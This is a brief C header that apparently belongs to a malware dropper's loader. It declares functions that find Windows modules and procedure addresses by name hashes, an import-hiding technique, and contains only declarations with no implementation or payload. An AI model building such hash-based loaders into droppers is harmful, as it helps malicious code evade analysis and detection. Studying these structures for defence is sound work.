#ifndef __DROPPER_LDR_H
#define __DROPPER_LDR_H

HMODULE
LdrGetModule(
    IN DWORD dwModuleNameHash
    );

ULONG
LdrGetProcAddressEx(
    IN  HMODULE hModule,
    IN  ULONG   dwProcCount,
    IN  PDWORD  dwNameSumsList,
    OUT PVOID   ProcessList
    );

#if 0
    PVOID
    LdrGetProcAddress(
        IN HMODULE hModule,
        IN DWORD   dwProcNameHash
        );
#endif

#endif
